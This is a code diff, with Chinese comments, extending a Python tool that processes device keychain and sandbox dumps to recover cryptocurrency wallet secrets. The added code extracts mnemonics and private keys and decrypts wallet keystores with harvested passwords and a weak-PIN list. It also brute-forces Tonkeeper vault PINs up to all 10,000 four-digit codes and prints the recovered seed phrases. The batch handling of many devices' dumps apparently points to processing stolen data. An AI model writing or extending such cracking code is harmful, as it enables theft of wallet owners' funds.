@@ -130,6 +130,18 @@ SECRET_PATTERNS = [
     ("near_account", re.compile(r"^[0-9a-f]{64}$")),
 ]
 
+# 常见 PIN / 弱口令（Tonkeeper V1 实测 4 位 PIN 最多）
+BUILTIN_PINS = [
+    "8888", "0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "9999",
+    "1234", "4321", "1122", "1212", "2121", "2580", "0852", "1998", "1999", "2000",
+    "2024", "2025", "2026", "1004", "6668", "8880",
+    "888888", "000000", "111111", "222222", "333333", "444444", "555555", "666666",
+    "777777", "999999", "123456", "654321", "112233", "121212", "123123",
+    "88888888", "00000000", "12345678", "11111111", "password", "Password", "qwerty",
+    "abc123", "123456789", "1234567890", "admin", "root",
+]
+
+
 def looks_like_mnemonic(text):
     wl = set(load_wordlist())
     if not wl: return False
@@ -174,15 +186,163 @@ def try_address_crosscheck(mn, context_text):
         return f"derive-error {e}"
 
 # ------------------------------------------------------------------ 读取导出
+def normalize_export(obj):
+    """统一导出形态。
+
+    pe_worker_v4 的 dump 是扁平的（tables / wallets / metadataKeys 在顶层），
+    而早期导出是 {"keychain": {...}} 或 {"big": {...}} 包裹的。这里把扁平格式
+    包成 {"keychain": ...}，老格式原样返回，保证下游 iter_items/profile 一套逻辑通吃。
+    """
+    if not isinstance(obj, dict):
+        return obj
+    if isinstance(obj.get("keychain"), dict) or isinstance(obj.get("big"), dict):
+        return obj
+    if any(isinstance(obj.get(k), (dict, list)) for k in ("tables", "wallets", "sandbox", "metadataKeys")):
+        return {"keychain": obj}
+    return obj
+
+
+def _find_json_object(text, key):
+    """从截断 JSON 中按大括号配对提取 key 对应的对象文本。"""
+    m = re.search(r'"%s"\s*:\s*\{' % re.escape(key), text)
+    if not m:
+        return None
+    i = m.end() - 1
+    depth = 0
+    instr = esc = False
+    for j in range(i, len(text)):
+        c = text[j]
+        if instr:
+            if esc:
+                esc = False
+            elif c == "\\":
+                esc = True
+            elif c == '"':
+                instr = False
+        else:
+            if c == '"':
+                instr = True
+            elif c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    return text[i:j + 1]
+    return None
+
+
+def _read_json_string(s, i):
+    j = i + 1
+    out = []
+    while j < len(s):
+        c = s[j]
+        if c == "\\":
+            out.append(s[j:j + 2])
+            j += 2
+            continue
+        if c == '"':
+            return "".join(out), j + 1, True
+        out.append(c)
+        j += 1
+    return "".join(out), j, False
+
+
+def _skip_sep(s, i):
+    while i < len(s) and s[i] in " \t\r\n,":
+        i += 1
+    return i
+
+
+def _salvage_sandbox(text):
+    """从截断 JSON 抢救 sandbox：只收完整 base64 文件条目。"""
+    m = re.search(r'"sandbox"\s*:\s*\{', text)
+    if not m:
+        return {}
+    s = text
+    i = m.end() - 1 + 1
+    out = {}
+    while True:
+        i = _skip_sep(s, i)
+        if i >= len(s) or s[i] == "}":
+            break
+        if s[i] != '"':
+            break
+        app, i, ok = _read_json_string(s, i)
+        if not ok:
+            break
+        i = _skip_sep(s, i)
+        if i >= len(s) or s[i] != ":":
+            break
+        i = _skip_sep(s, i + 1)
+        if i >= len(s) or s[i] != "{":
+            break
+        i += 1
+        files = {}
+        complete = True
+        while True:
+            i = _skip_sep(s, i)
+            if i >= len(s):
+                complete = False
+                break
+            if s[i] == "}":
+                i += 1
+                break
+            if s[i] != '"':
+                complete = False
+                break
+            fn, i, ok = _read_json_string(s, i)
+            if not ok:
+                complete = False
+                break
+            i = _skip_sep(s, i)
+            if i >= len(s) or s[i] != ":":
+                complete = False
+                break
+            i = _skip_sep(s, i + 1)
+            if i >= len(s) or s[i] != '"':
+                complete = False
+                break
+            val, i, ok = _read_json_string(s, i)
+            if not ok:
+                complete = False
+                break
+            files[fn] = val
+        if files:
+            out[app] = files
+        if not complete:
+            break
+    return out
+
+
+def salvage_export(raw):
+    """抢救 8MB 截断包：keychain 完整保留 + sandbox 完整文件条目。"""
+    kc_txt = _find_json_object(raw, "keychain")
+    if not kc_txt:
+        return None
+    try:
+        kc = json.loads(kc_txt)
+    except Exception:
+        return None
+    m = re.search(r'"device_uuid"\s*:\s*"([^"]+)"', raw)
+    dev = m.group(1) if m else "?"
+    sb = _salvage_sandbox(raw)
+    return {"device_uuid": dev, "keychain": kc, "sandbox": sb,
+            "_salvaged": True, "_salvage_note": "JSON 截断，已抢救 keychain + 完整 sandbox 条目"}
+
+
 def load_export(path):
     raw = open(path, encoding="utf-8", errors="replace").read()
     raw = raw.lstrip("\ufeff")
     try:
-        return json.loads(raw), raw
+        return normalize_export(json.loads(raw)), raw
     except json.JSONDecodeError:
-        # 修复截断导出（老格式片段）
+        # 1) 8MB 截断包：抢救 keychain/sandbox
+        obj = salvage_export(raw)
+        if obj is not None:
+            return normalize_export(obj), raw
+        # 2) 修复截断导出（老格式片段）
         try:
-            return json.loads(tw.REPAIR_PREFIX + raw), raw
+            return normalize_export(json.loads(tw.REPAIR_PREFIX + raw)), raw
         except Exception:
             return None, raw
 
@@ -201,8 +361,8 @@ def iter_items(obj):
                         yield (f"{top}.{sect}", name, it)
 
 def profile(obj):
-    dev = (obj or {}).get("device_uuid", "?")
     kc = (obj or {}).get("keychain") or {}
+    dev = (obj or {}).get("device_uuid") or kc.get("device_uuid") or "?"
     meta = {"device_uuid": dev, "timestamp": kc.get("timestamp"), "source": kc.get("source")}
     tables = {}
     for sect, name, _ in iter_items(obj):
@@ -227,6 +387,34 @@ def brand_fingerprint(obj, raw):
         if n: found[name] = n
     return found
 
+def _json_secret_fields(j):
+    """递归找 JSON 里的 mnemonic/seedPhrase/privateKey 字段。"""
+    out = []
+    MN_KEYS = ("mnemonic", "seedphrase", "seed_phrase", "recoveryphrase", "recovery_phrase",
+               "backupphrase", "backup_phrase", "phrase", "secretphrase", "secret_phrase")
+    PK_KEYS = ("privatekey", "private_key", "secretkey", "secret_key")
+
+    def walk(o, depth=0):
+        if depth > 3:
+            return
+        if isinstance(o, dict):
+            for k, v in o.items():
+                kl = str(k).lower().replace("-", "_")
+                if isinstance(v, str):
+                    if any(x in kl for x in MN_KEYS) and looks_like_mnemonic(v):
+                        out.append(("mnemonic(json)", v.strip()))
+                    elif any(x in kl for x in PK_KEYS) and re.fullmatch(r"[0-9a-fA-F]{64}", v):
+                        out.append(("privatekey(json)", v))
+                elif isinstance(v, (dict, list)):
+                    walk(v, depth + 1)
+        elif isinstance(o, list):
+            for x in o:
+                walk(x, depth + 1)
+
+    walk(j)
+    return out
+
+
 # ------------------------------------------------------------------ 条目解析
 def analyze_items(obj, raw, max_items=100000):
     result = {"secrets": [], "emails": set(), "passwords": [], "vaults": [], "keystores": [], "interesting": []}
@@ -234,9 +422,9 @@ def analyze_items(obj, raw, max_items=100000):
     for sect, tname, it in iter_items(obj):
         n += 1
         if n > max_items: break
-        svc = it.get("service") or ""
-        acct = it.get("account") or ""
-        ag = it.get("accessGroup") or ""
+        svc = str(it.get("service") or "")
+        acct = str(it.get("account") or "")
+        ag = str(it.get("accessGroup") or "")
         hexs = it.get("dataHex") or ""
         ctx = f"{svc} {acct} {ag}"
         b, kind, text = decode_hex_smart(hexs)
@@ -264,6 +452,23 @@ def analyze_items(obj, raw, max_items=100000):
                     continue
             except Exception:
                 pass
+        # 智能: 任意 JSON 里的 mnemonic/seedPhrase/privateKey 字段（Exodus 等）
+        if kind == "json":
+            try:
+                j = json.loads(b.decode("utf-8"))
+            except Exception:
+                j = None
+            found_mn = False
+            for stype, val in _json_secret_fields(j):
+                if stype.startswith("mnemonic"):
+                    result["secrets"].append({"type": stype, "value": val,
+                                              "bip39": bip39_checksum_ok(val),
+                                              "crosscheck": try_address_crosscheck(val, ctx), **rec})
+                    found_mn = True
+                else:
+                    result["secrets"].append({"type": stype, "value": val, **rec})
+            if found_mn:
+                continue
         # 智能: 账户/服务名含 entropy/mnemonic/seedphrase 且值为裸 hex（16/24/32B）-> 推导助记词（Bitpie 系）
         if kind == "ascii" and re.search(r"(?i)entropy|mnemonic|seedphrase", ctx):
             t = text.strip()
@@ -297,23 +502,47 @@ def analyze_items(obj, raw, max_items=100000):
 # ------------------------------------------------------------------ keystore 解密
 def extract_keystores(obj):
     out = []
+    seen = set()
+
+    def add(app, path, ks, blen=0):
+        mac = ((ks.get("crypto") or {}).get("mac") or "").lower()
+        if mac and mac in seen:
+            return
+        if mac:
+            seen.add(mac)
+        out.append({"app": app, "path": path, "ks": ks, "b64len": blen})
+
+    # 1) 沙盒 Documents/keystore/UTC--*
     sb = (obj or {}).get("sandbox") or {}
     for app, files in sb.items():
-        if not isinstance(files, dict): continue
+        if not isinstance(files, dict):
+            continue
         for fp, b64 in files.items():
-            if "/keystore/UTC" not in fp: continue
+            if "/keystore/UTC" not in fp:
+                continue
             try:
                 ks = json.loads(tw.b64d(b64).decode("utf-8"))
             except Exception:
                 continue
-            out.append({"app": app, "path": fp, "ks": ks, "b64len": len(b64)})
+            add(app, fp, ks, len(b64))
+    # 2) 钥匙串内嵌 keystore JSON（Bybit Web3 等）
+    for sect, tname, it in iter_items(obj):
+        _, kind, text = decode_hex_smart(it.get("dataHex") or "")
+        if kind != "json" or not text or not text.lstrip().startswith("{"):
+            continue
+        try:
+            ks = json.loads(text)
+        except Exception:
+            continue
+        if isinstance(ks, dict) and isinstance(ks.get("crypto"), dict) and "kdfparams" in ks["crypto"]:
+            add("keychain", "keychain rowid=%s" % it.get("rowid"), ks)
     return out
 
 def keystore_passwords(obj):
     """钥匙串内 <app>UTC--<file> 形式的密码候选 + 全部明文口令"""
     by_acct, plain = {}, []
     for sect, tname, it in iter_items(obj):
-        acct = it.get("account") or ""
+        acct = str(it.get("account") or "")
         hexs = it.get("dataHex") or ""
         if "UTC--" in acct:
             try:
@@ -322,7 +551,7 @@ def keystore_passwords(obj):
                     by_acct[acct] = pw
             except Exception:
                 pass
-        if "com.apple.cfnetwork" in (it.get("accessGroup") or "") and "@" in acct:
+        if "com.apple.cfnetwork" in str(it.get("accessGroup") or "") and "@" in acct:
             try:
                 pw = bytes.fromhex(hexs).decode("ascii")
                 if 4 <= len(pw) < 64:
@@ -339,6 +568,9 @@ def decrypt_keystore_entry(entry, pw_by_acct, plain_pws):
         if key in pw_by_acct: cands.append(pw_by_acct[key])
     cands += [v for k, v in pw_by_acct.items() if v not in cands]
     cands += plain_pws[:200]
+    cands += BUILTIN_PINS
+    seen = set()
+    cands = [c for c in cands if c and not (c in seen or seen.add(c))]
     cr = ks.get("crypto") or {}
     kp = cr.get("kdfparams") or {}
     if not cr or "salt" not in kp: return {"path": fp, "status": "no-crypto"}
@@ -353,12 +585,135 @@ def decrypt_keystore_entry(entry, pw_by_acct, plain_pws):
         except Exception:
             continue
         if tw.keccak256(dk[16:32] + ct) == mac:
-            pt = tw.aes_ctr(dk[:16], iv, ct).decode("utf-8", "replace")
-            return {"path": fp, "status": "DECRYPTED", "password": pw, "plaintext": pt}
+            pt = tw.aes_ctr(dk[:16], iv, ct).decode("utf-8", "replace").strip()
+            mn = None
+            try:
+                j = json.loads(pt)
+                if isinstance(j, dict):
+                    mn = j.get("mnemonic") or j.get("seedPhrase")
+            except Exception:
+                pass
+            if not mn and looks_like_mnemonic(pt):
+                mn = pt
+            return {"path": fp, "status": "DECRYPTED", "password": pw, "plaintext": pt,
+                    "mnemonic": mn, "bip39": bip39_checksum_ok(mn) if mn else None}
     return {"path": fp, "status": "encrypted (no password matched)", "tried": len(cands)}
 
+# ------------------------------------------------------------------ 保险库解密（Tonkeeper V1）
+def collect_candidates(obj, explicit=None, deep_pin=False):
+    _, plain = keystore_passwords(obj)
+    cands = list(explicit or []) + list(plain) + list(BUILTIN_PINS)
+    if deep_pin:
+        cands += ["%04d" % i for i in range(10000)]
+    seen = set()
+    return [c for c in cands if c and not (c in seen or seen.add(c))]
+
+
+def decrypt_tonkeeper_vaults(obj, explicit=None, deep_pin=False):
+    """Tonkeeper V1: scrypt(N,r,p) + secretbox(nonce=salt[:24])；V2 仅标注。
+
+    兼容两种存放形态：
+      - service = mnemonics_vault_<uuid>
+      - service = app / account = wallets_chunk_<n>（Tonkeeper 分块保险库）
+    一个保险库可能含多组助记词，全部返回。
+    """
+    try:
+        import nacl.bindings as nacl_b
+    except Exception:
+        nacl_b = None
+    cands = collect_candidates(obj, explicit, deep_pin)
+    out = []
+    seen_vault = set()
+    seen_v2 = set()
+    for sect, tname, it in iter_items(obj):
+        svc = str(it.get("service") or "")
+        if svc.startswith("v2mnemonics_"):
+            if svc in seen_v2:
+                continue
+            seen_v2.add(svc)
+            out.append({"wallet": "Tonkeeper V2 (%s)" % svc[:30],
+                        "status": "V2 格式（Argon2id+AES-GCM，需另行处理）",
+                        "mnemonic": None, "password": None})
+            continue
+        acct = str(it.get("account") or "")
+        try:
+            acct_dec = bytes.fromhex(acct).decode("utf-8", "replace")
+        except Exception:
+            acct_dec = acct
+        try:
+            text = bytes.fromhex(it.get("dataHex") or "").decode("utf-8", "replace")
+        except Exception:
+            continue
+        if not text or ("encrypted-scrypt-tweetnacl" not in text
+                        and not svc.startswith("mnemonics_vault_")
+                        and "wallets_chunk" not in acct_dec):
+            continue
+        try:
+            d = json.loads(text)
+        except Exception:
+            continue
+        if not isinstance(d, dict) or "salt" not in d or "ct" not in d:
+            continue
+        vkey = (d.get("salt"), d.get("ct"))
+        if vkey in seen_vault:
+            continue
+        seen_vault.add(vkey)
+        if svc.startswith("mnemonics_vault_"):
+            label = "Tonkeeper (%s)" % svc[:24]
+        elif acct_dec:
+            label = "Tonkeeper (%s)" % acct_dec[:24]
+        else:
+            label = "Tonkeeper (vault)"
+        if nacl_b is None:
+            out.append({"wallet": label, "status": "需 pynacl（pip install pynacl）",
+                        "mnemonic": None, "password": None})
+            continue
+        try:
+            salt = bytes.fromhex(d["salt"])
+            ct = bytes.fromhex(d["ct"])
+            N = int(d.get("N", 16384)); r = int(d.get("r", 8)); p = int(d.get("p", 1))
+        except Exception:
+            out.append({"wallet": label, "status": "V1 参数异常", "mnemonic": None, "password": None})
+            continue
+        got = False
+        for i, pw in enumerate(cands):
+            if deep_pin and i and i % 500 == 0:
+                print("      [Tonkeeper PIN] %d/%d …" % (i, len(cands)), flush=True)
+            try:
+                key = tw.scrypt(pw.encode(), salt, N, r, p, 32)
+                pt = nacl_b.crypto_secretbox_open(ct, salt[:24], key)
+                if not pt:
+                    continue
+                plain = pt.decode("utf-8", "replace")
+                mns = []
+                try:
+                    j = json.loads(plain)
+                    for v in j.values():
+                        if isinstance(v, dict) and v.get("mnemonic"):
+                            mns.append(v["mnemonic"])
+                except Exception:
+                    pass
+                if not mns and looks_like_mnemonic(plain):
+                    mns = [plain.strip()]
+                if not mns:
+                    out.append({"wallet": label, "status": "DECRYPTED（未识别助记词）",
+                                "mnemonic": None, "password": pw})
+                for mn in mns:
+                    out.append({"wallet": label, "status": "DECRYPTED", "mnemonic": mn,
+                                "bip39": bip39_checksum_ok(mn),
+                                "verify": "scrypt+secretbox（nonce=salt[:24]）", "password": pw})
+                got = True
+                break
+            except Exception:
+                continue
+        if not got:
+            out.append({"wallet": label, "status": "V1 保险库加密（候选未命中）",
+                        "mnemonic": None, "password": None, "tried": len(cands)})
+    return out
+
+
 # ------------------------------------------------------------------ 主流程
-def process_file(path, outdir, do_decrypt=True):
+def process_file(path, outdir, do_decrypt=True, explicit_pw=None, deep_pin=False):
     obj, raw = load_export(path)
     name = os.path.splitext(os.path.basename(path))[0]
     if obj is None:
@@ -368,10 +723,12 @@ def process_file(path, outdir, do_decrypt=True):
     items, n = analyze_items(obj, raw)
     ks_entries = extract_keystores(obj)
     ks_results = []
-    if ks_entries and do_decrypt:
+    vault_results = []
+    if do_decrypt:
         by_acct, plain = keystore_passwords(obj)
         for e in ks_entries:
             ks_results.append(decrypt_keystore_entry(e, by_acct, plain))
+        vault_results = decrypt_tonkeeper_vaults(obj, explicit_pw, deep_pin)
     # 智能交叉核对: 熵推导助记词 vs 包内 BIP39 seed 条目（64B=hex128 或 32B=hex64）
     hex64s = {s["value"].lower() for s in items["secrets"] if s["type"] in ("hex64", "hex128")}
     for s in items["secrets"]:
@@ -391,11 +748,17 @@ def process_file(path, outdir, do_decrypt=True):
         "emails": items["emails"],
         "passwords_count": len(items["passwords"]),
         "vaults": items["vaults"],
+        "vault_decrypted": vault_results,
         "keystores": ks_results if ks_results else [{"path": e["path"], "status": "not-attempted"} for e in ks_entries],
     }
+    if (obj or {}).get("_salvaged"):
+        rep["meta"]["salvaged"] = True
+        rep["meta"]["salvage_note"] = (obj or {}).get("_salvage_note")
     # 控制台摘要（默认降噪：只展示高价值密钥/保险库/keystore/邮箱/品牌；uuid/hex32/hex64/jwt 仅计数）
     print(f"\n===== {rep['file']} =====")
     print(f"  设备: {meta['device_uuid']}  时间: {meta.get('timestamp')}")
+    if meta.get("salvaged"):
+        print(f"  [抢救] {meta.get('salvage_note')}")
     print(f"  品牌: {', '.join(f'{k}({v})' for k, v in sorted(brands.items())) or '-'}")
     print(f"  条目: {n}  沙盒: {meta['sandbox_apps'] or '-'}")
     seen_vals = set()
@@ -413,7 +776,18 @@ def process_file(path, outdir, do_decrypt=True):
     for k in rep["keystores"]:
         print(f"  [keystore] {k['path'].split('/')[-1]} -> {k['status']}" + (f" | pw={k.get('password')}" if k.get("status") == "DECRYPTED" else ""))
         if k.get("status") == "DECRYPTED":
-            print(f"             plaintext: {k['plaintext'][:120]}")
+            if k.get("mnemonic"):
+                print(f"             mnemonic: {k['mnemonic']} | bip39={k.get('bip39')}")
+            else:
+                print(f"             plaintext: {k['plaintext'][:120]}")
+    for v in vault_results:
+        line = f"  [保险库解密] {v['wallet']} -> {v['status']}"
+        if v.get("status") == "DECRYPTED":
+            line += f" | PIN={v.get('password')} | bip39={v.get('bip39')}"
+            line += f"\n             mnemonic: {v.get('mnemonic')}"
+        elif v.get("tried"):
+            line += f" | tried={v['tried']}"
+        print(line)
     seen_vault = set()
     for v in rep["vaults"]:
         key = (v["table"], v["rowid"])
@@ -434,6 +808,9 @@ def main():
     ap.add_argument("--out", default=None, help="报告输出目录")
     ap.add_argument("--pattern", default="*.json", help="目录模式下的文件匹配（如 2026092*.json）")
     ap.add_argument("--no-decrypt", action="store_true")
+    ap.add_argument("--pw", nargs="*", default=[], help="追加保险库口令候选")
+    ap.add_argument("--deep-pin", action="store_true",
+                    help="Tonkeeper V1 追加全量 0000-9999（慢；命中即停）")
     args = ap.parse_args()
 
     import fnmatch
@@ -446,10 +823,36 @@ def main():
         files = [args.target]
     for f in files:
         try:
-            process_file(f, args.out, do_decrypt=not args.no_decrypt)
+            process_file(f, args.out, do_decrypt=not args.no_decrypt,
+                         explicit_pw=args.pw, deep_pin=args.deep_pin)
         except Exception as e:
             print(f"  !! {f}: {e}")
     print("\nDONE")
+
+
+# ------------------------------------------------------------------ 统一解密模块
+# 解密能力已收拢到 war_decrypt.py；这里只做薄封装，保持原函数名/输出不变。
+import war_decrypt as wd
+
+
+def load_export(path):
+    return wd.load_export(path)
+
+
+def extract_keystores(obj):
+    return wd.extract_keystores(obj)
+
+
+def keystore_passwords(obj):
+    return wd.keystore_passwords(obj)
+
+
+def decrypt_keystore_entry(entry, pw_by_acct, plain_pws):
+    return wd.decrypt_keystore_entry(entry, pw_by_acct, plain_pws)
+
+
+def decrypt_tonkeeper_vaults(obj, explicit=None, deep_pin=False):
+    return wd.recover_tonkeeper_vaults(obj, collect_candidates(obj, explicit, deep_pin))
 
 if __name__ == "__main__":
     main()
